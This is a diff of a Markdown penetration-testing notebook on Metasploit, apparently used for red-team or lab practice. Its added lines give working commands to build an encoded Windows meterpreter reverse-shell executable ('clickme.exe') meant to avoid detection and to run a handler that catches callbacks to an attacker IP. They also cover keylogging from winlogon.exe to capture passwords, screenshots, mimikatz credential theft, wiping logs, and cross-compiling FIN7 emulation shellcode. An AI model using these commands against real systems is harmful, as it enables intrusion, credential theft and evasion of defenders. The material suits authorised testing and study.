@@ -5,6 +5,11 @@
 {lang="bash"}
     sudo apt -y install msfpc
 
+The core commands are
+
+* msfconsole: command line console
+
+
 ## Scanning
 
 In Auxilary/Scanner folder
@@ -65,6 +70,19 @@ https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/
 
 ### MSFVenom generate payload
 
+There are plenty of payloads already built into MSFVenom. You can get a list by calling
+
+{lang="bash"}
+    msfvenom -l payloads
+
+Make sure the one you are using is matching your scenario:
+
+* Architecture (32 or 64 bit)
+* Platform (windows/linux/...)
+* Communication channel or direct command
+
+The platform/architecture will limit the encoders you can pick in a later step
+
 {lang="bash"}
     msfvenom --platform windows --payload windows/meterpreter/reverse_tcp lhost=<ip> lport=1234 -e x86/shikata_ga_nai -f exe -o clickme.exe
 
@@ -72,10 +90,19 @@ Generates an exe file that will contain a meterpreter
 
 Iterators can be used to make it harder to detect
 
-Shikata Ga Nai is the encoder. Addint the parameter *-i 5* will add 5 encoding iterations to the generation
+Shikata Ga Nai is the encoder. Add in the parameter *-i 5* will add 5 encoding iterations to the generation. It requires windows 32 bit.
 
 {lang="bash"}
     msfvenom -l encoders # List additional encoders
+
+As soon as msfvenom is running on the target, connect to the msfconsole and listen to the beacons:
+
+{lang="bash"}
+    use exploit/multi/handler
+    set payload windows/x64/meterpreter/reverse_https
+    set LHOST 192.168.178.100   # YMMV, the IP of the controlling server
+    set LPORT 6666 # (YMMV), if you did not set any port when generating the payload, leave it empty
+    run
 
 ### Veil
 
@@ -95,11 +122,6 @@ Metasploit can have several parallel sessions to controlled machines
 {lang="bash"}
     sessions  # List sessions
     sessions -i 5  # Switch to session 5
-
-
-
-
-
 
 ### Escalate permissions
 
@@ -138,6 +160,7 @@ Commands can be
 
 %% TODO: Investigate command listing    mimikatz_command -f fu::
 %%  TODO: mimikatz_command -f sekurlsa::searchPasswords    (for different password sources)
+%% kerberos cheat sheet: https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
 
 {lang="bash"}
     load kiwi
@@ -171,7 +194,14 @@ Only a few common dlls can be called directly.
 
 %% TODO: Test  railgun.client.sys.config.sysinfo and railgubn.shell32.IsUserAnAdmin
 
+%% Infos covering available DLLs:
+%% https://source.winehq.org/WineAPI/
+%% https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list?redirectedfrom=MSDN
+
 ## Covering tracks
+
+One thing a thing an attacker will try is to hide the tracks. There are more or less extreme tools for that.
+The extreme one (clearev) will destroy lots of evidence. But at the same time would be a great indicator to raise the alert.
 
 Modify file times
 
@@ -214,11 +244,15 @@ On a meterpreter session
 
 ## Screenshots
 
-Using Armitage here may be convenient as it has a UI
+Using Armitage here may be convenient as it has a UI.
+
+You first have to *migrate* to a process with active desktop permissions (NT AUTHORITY\SYSTEM). After that load espia
 
 {lang="bash"}
     load espia
     screengrab
+
+The resulting image will be dropped locally.
 
 Several screen shots in series:
 
@@ -229,11 +263,11 @@ Results will be stored in loot
 
 ## Keylogging
 
-Migrate to a user process first !
+Migrate to a user process first ! *explorer.exe* is interesting because it runs during the session. Migrating to *winlogon.exe* will offer you all the passwords....
 
 {lang="bash"}
     keyscan_start
-    keyscan_stop
+    # ...wait...
     keyscan_dump
 
 ## Metasploitable 2
@@ -275,7 +309,11 @@ https://blog.rapid7.com/2018/10/09/introducing-metasploits-first-evasion-module/
 ## Building tools
 
 Some time it is necessary to compile tools based on metasploit shellcode. Cross compilation or
-VisualStudio on Linux could be needed to get those Windows tools. Some experience with those here:
+VisualStudio on Linux could be needed to get those Windows tools. Most likely Window sis your target.
+And Kali ist the machine you are running Metasploit on and generating Shellcodes with. So Cross compiling is the laziest approach.
+
+
+Some experience with those here:
 
 ### Mingw
 
@@ -296,19 +334,34 @@ Example fixing and building a payload file:
 
 {lang="bash"}
     wget https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step4/babymetal/babymetal.cpp
-    wget https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step4/babymetal/ConvertTo-Shellcode.ps1
     sed -i 's/#include <Windows.h>/#include <windows.h>/g' babymetal.cpp
+    # 64 bit dll
     x86_64-w64-mingw32-g++ -shared babymetal.cpp -o BabyMetal.dll
     python3 sRDI/Python/ConvertToShellcode.py -f BabyMetal ./BabyMetal.dll
     base64 BabyMetal.bin > encoded.txt
 
+(Adding the MSFVenom generated shellcode to the source code is not included in this example)
 
 *pwsh ConvertTo-Shellcode.ps1 -File BabyMetal.dll -FunctionName BabyMetal* Does not work on linux as system modules are missing.
 
+Sometimes you will need explicit 32 Bit tools. You can get them by:
+
+{lang="bash"}
+    i686-w64-mingw32-gcc -m32 -L/usr/i686-w64-mingw32/lib -I/usr/i686-w64-mingw32/include infile.c -o outfile.exe
 
 sed is required because *windows.h* is a lowercase file on linux. But the include in the example files is *Windows.h*
 
-### VisualStudio on Linux
+**Unicode Windows**
+
+Unicode windows C code has a main function called "wmain". To activate unicode when cross compiling, use:
+
+{lang="bash"}
+    x86_64-w64-mingw32-gcc -municode -D UNICODE -D _UNICODE  # ...
+
+Linking to NTDLL (often required for Windows):
+
+{lang="bash"}
+    x86_64-w64-mingw32-gcc -L/usr/x86_64-w64-mingw32/lib/ -l:libntdll.a  # ...
 
 ## Sources
 
@@ -346,3 +399,13 @@ sed is required because *windows.h* is a lowercase file on linux. But the includ
 %% TODO: Open Vas /OpenVas https://www.openvas.org/index-de.html   Vulnerability Assessment
 
 %% "show evasion" for evasion tech in Metasploit
+
+%% TODO Add autopwn module for browser exploits
+%% Run MITM/Nethunter to leverage browser exploits
+%% Simulate Evil Maid attack
+%% Experiment with malicious Android Exploits
+%% Pass-the-hash attacks
+%% (Kerberos) tickets
+
+%% Kage simple UI
+%% Pen test standards http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines
